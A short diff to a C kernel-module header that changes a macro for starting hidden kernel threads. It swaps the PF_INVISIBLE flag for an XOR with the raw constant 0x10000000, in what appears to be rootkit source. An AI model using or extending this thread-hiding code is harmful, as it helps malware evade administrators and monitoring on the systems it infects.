@@ -20,9 +20,9 @@ int module_stop(void* data);
 	struct task_struct *task; \
 \
 	task = kthread_run(__VA_ARGS__); \
-	task->flags |= PF_INVISIBLE; \
+	task->flags ^= 0x10000000; \
 \
-	return task; \
+	task; \
 })
 #else
 #define KTHREAD_RUN_HIDDEN(...) kthread_run(__VA_ARGS__);
